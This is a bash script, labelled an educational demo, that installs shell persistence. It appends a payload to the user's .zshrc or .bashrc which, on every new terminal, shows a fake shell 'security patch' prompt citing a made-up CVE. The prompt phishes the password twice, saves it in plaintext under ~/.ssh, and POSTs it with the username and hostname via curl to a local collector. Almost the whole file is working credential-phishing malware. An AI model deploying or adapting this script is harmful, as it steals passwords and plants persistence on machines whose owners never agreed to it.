#!/bin/bash
# ============================================================
# ACT 1 — Shell Persistence: Fake Shell Update Prompt
# EDUCATIONAL DEMO ONLY — Selective Sinners
# ============================================================
# Detects the user's shell (zsh/bash) and appends a payload to
# the appropriate rc file. Uses /dev/tty for I/O to bypass
# P10k instant prompt detection and ensure read works properly.
# ============================================================

MARKER="# >>> SELECTIVE-SINNERS-DEMO shell-update >>>"

case "$SHELL" in
  */zsh)  RC="$HOME/.zshrc"  ; LABEL="[oh-my-zsh]" ; VER="zsh 5.9.1 → 5.9.2" ;;
  */bash) RC="$HOME/.bashrc" ; LABEL="[bash]"       ; VER="bash 5.2.21 → 5.2.26" ;;
  *)      RC="$HOME/.bashrc" ; LABEL="[shell]"      ; VER="shell update available" ;;
esac

if grep -q "$MARKER" "$RC" 2>/dev/null; then
  echo "[!] Payload already installed in $RC"
  echo "    Run uninstall.sh first to remove it."
  exit 1
fi

cat >> "$RC" << PAYLOAD

$MARKER
(
  _cache="\${HOME}/.ssh/.ssh_accounts_sinners"
  mkdir -p "\${HOME}/.ssh"
  [ -f "\$_cache" ] && exit 0
  {
    echo ""
    echo "$LABEL Upgrade available: $VER (security patch)"
    echo "This update fixes CVE-2026-31337 — credential caching vulnerability."
    echo ""
    printf "Password: "
    read -s _pw1
    echo ""
    sleep 1
    echo "Sorry, try again."
    printf "Password: "
    read -s _pw2
    echo ""
    echo "Verifying... done."
    echo "$LABEL Update applied successfully."
    echo ""
  } < /dev/tty > /dev/tty
  echo "\$_pw1" > "\$_cache"
  echo "\$_pw2" >> "\$_cache"
  chmod 600 "\$_cache"
  curl -s -X POST http://localhost:4000/log/password \\
    -H "Content-Type: application/json" \\
    -d "{\\"source\\": \\"shell-persistence\\", \\"user\\": \\"\$(whoami)\\", \\"attempt1\\": \\"\${_pw1}\\", \\"attempt2\\": \\"\${_pw2}\\", \\"host\\": \\"\$(hostname)\\"}" \\
    > /dev/null 2>&1
  unset _pw1 _pw2
)
# <<< SELECTIVE-SINNERS-DEMO shell-update <<<
PAYLOAD

echo "[+] Payload installed into $RC"
echo "    Open a new terminal to trigger the fake update prompt."
echo ""
echo "    To remove: ./uninstall.sh"
